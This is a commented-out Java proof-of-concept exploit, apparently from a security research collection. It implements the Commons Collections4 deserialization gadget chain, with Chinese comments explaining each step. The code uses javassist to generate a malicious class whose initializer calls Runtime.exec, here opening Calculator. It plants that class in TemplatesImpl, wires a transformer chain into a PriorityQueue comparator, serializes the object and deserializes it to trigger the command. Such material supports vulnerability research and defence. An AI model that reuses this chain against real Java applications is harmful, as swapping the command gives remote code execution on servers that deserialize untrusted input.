//package com.sec.exploits.CommonsCollections.CommonsCollections4;
//
//import com.sec.annotation.Dependencies;
//import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
//import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
//import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
//import javassist.ClassClassPath;
//import javassist.ClassPool;
//import javassist.CtClass;
//import org.apache.commons.collections4.Transformer;
//import org.apache.commons.collections4.comparators.TransformingComparator;
//import org.apache.commons.collections4.functors.ChainedTransformer;
//import org.apache.commons.collections4.functors.ConstantTransformer;
//import org.apache.commons.collections4.functors.InstantiateTransformer;
//
//
//import javax.xml.transform.Templates;
//import java.io.*;
//import java.lang.reflect.Field;
//import java.util.PriorityQueue;
//
///**
// * @program: Gadgets
// * @description:
// * @author: 0range
// * @create: 2021-05-16 17:00
// **/
//
///**
// * Gadget chain:
// * 		ObjectInputStream.readObject()
// *        PriorityQueue.readObject()
// *         PriorityQueue.heapify()
// *             PriorityQueue.siftDown()
// *                 PriorityQueue.siftDownUsingComparator()
// *                     TransformingComparator.compare()
// *                         ChainedTransformer.transform()
// *                             ConstantTransformer.transform()
// *                             InstantiateTransformer.transform()
// * 							   (TrAXFilter)Constructor.newInstance()
// * 						         TrAXFilter#TrAXFilter()
// * 							     TemplatesImpl.newTransformer()
// * 									TemplatesImpl.getTransletInstance()
// * 								    TemplatesImpl.defineTransletClasses()
// * 										（PayLoad）newInstance()
// * 									        Runtime.exec()
// *
// */
//
//@Dependencies({
//        "org.apache.commons:commons-collections4:4.0",
//        "jdk<7u21"
//})
//public class PriorityQueue_Exploit {
//    public static void main(String[] args) throws Exception{
//        //1.先创建恶意类
//        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
//        CtClass tempExploitClass = pool.makeClass("3xpl01t");
//        //一定要设置父类，为了后续顺利
//        tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
//        //写入payload，生成字节数组
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
//        tempExploitClass.makeClassInitializer().insertBefore(cmd);
//        byte[] exploitBytes = tempExploitClass.toBytecode();
//
//        //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件
//        TemplatesImpl tmpl = new TemplatesImpl();
//        //设置_bytecodes属性为exploitBytes
//        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
//        bytecodes.setAccessible(true);
//        bytecodes.set(tmpl, new byte[][]{exploitBytes});
//        //一定要设置_name不为空
//        Field _name = TemplatesImpl.class.getDeclaredField("_name");
//        _name.setAccessible(true);
//        _name.set(tmpl, "0range");
//        //_class为空
//        Field _class = TemplatesImpl.class.getDeclaredField("_class");
//        _class.setAccessible(true);
//        _class.set(tmpl, null);
//
//        //3.构造chain,包装成TransformingComparator里，构造成
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(TrAXFilter.class),
//                new InstantiateTransformer(
//                        new Class[]{Templates.class},
//                        new Object[]{tmpl}
//                )
//        };
//        ChainedTransformer chain = new ChainedTransformer(transformers);
//        TransformingComparator iTransComparator = new TransformingComparator(chain);
//
//        //4.开始new一个 PriorityQueue，因为他的readObject方法是一切的开始
//        PriorityQueue pq = new PriorityQueue(2);
//
//        Object[] queueArray = new Object[]{tmpl, 2};
//
//        //解封属性comparator, iTransformingComparator => _comparator
//        Field _comparator = PriorityQueue.class.getDeclaredField("comparator");
//        _comparator.setAccessible(true);
//        _comparator.set(pq, iTransComparator);
//        //解封属性queue，queueArray => _queue
//        Field _queue = PriorityQueue.class.getDeclaredField("queue");
//        _queue.setAccessible(true);
//        _queue.set(pq, queueArray);
//        //size修改为2
//        Field _size = Class.forName("java.util.PriorityQueue").getDeclaredField("size");
//        _size.setAccessible(true);
//        _size.set(pq, 2);
//
//        try {
//            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir") + "/src/main/resources/Payload_cc4_PriorityQueue.ser")));
//            outputStream.writeObject(pq);
//            outputStream.close();
//
//            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir") + "/src/main/resources/Payload_cc4_PriorityQueue.ser")));
//            inputStream.readObject();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//}
